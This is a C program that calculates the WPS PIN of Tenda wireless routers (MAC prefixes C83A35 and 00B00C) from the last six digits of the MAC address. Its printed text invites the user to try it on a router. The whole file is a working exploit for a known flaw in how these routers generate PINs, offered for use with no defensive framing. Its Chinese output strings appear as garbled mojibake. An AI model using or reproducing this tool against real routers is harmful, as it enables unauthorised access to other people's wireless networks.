//Computes PIN code starts with OUI "C83A35" and "00B00C"

//Both two OUIs which belonged to Tenda Technology Co., Ltd are confirmed effectively.
//Coded by Zhaochunsheng - iBeini.com
//Modified by Lingxi - WiFiBETA.COM
 
 
#include <stdio.h>
#include <stdlib.h>
//#include <stdafx.h>
 
int main()
{
 
    unsigned int wps_pin_checksum(unsigned int pin);
    int PIN = 0;
 
 //   printf("ComputePIN-C83A35\n");
    printf("Description:\n");
    printf("If your wireless router MAC address start with \"C83A35\" or \"00B00C\",\n");
    printf("type the other six digits, you might be able to get the \n");
    printf("WPS-PIN of this equipment, please have a try, good luck!\n\n");
    printf("Code by ZhaoChunsheng 04/07/2012 http://iBeini.com\n\n");
    printf("Modified by Lingxi - WiFiBETA.COM\n\n");
//Translated to Chinese
 printf("˵����\n");
 printf("�����������·����MAC��ַ�ԡ�C83A35����00B00C����ͷ��\n");
 printf("�������λMAC��ַ�����ִ�Сд����������Ի�ø�·�ɵ�WPS PIN��Կ��\n");
 printf("ף����ˣ�\n\n");
 printf("���Դ�����д��2012��4��7��  Http://iBeini.com\n");
 printf("�������޸Ĳ�����  WiFiBETA.COM\n\n");
    printf("���������λMAC��ַ��HEX����\n");
    printf("Input the last 6 digits of MAC Address(HEX):");
	scanf("%x",&PIN);
    printf("������ĺ���λMAC��ַ�� %X\n",PIN);
    printf("Last 6 digits of MAC Address(HEX) are: %X\n",PIN);
    printf("WPS PIN is: %07d%d\n",PIN%10000000,wps_pin_checksum(PIN%10000000));
 
    return 0;
}
 
unsigned int wps_pin_checksum(unsigned int pin)
{
unsigned int accum = 0;
while (pin)
{
accum += 3 * (pin % 10);
pin /= 10;
accum += pin % 10;
pin /= 10;
}
 
    return (10 - accum % 10) % 10;
}


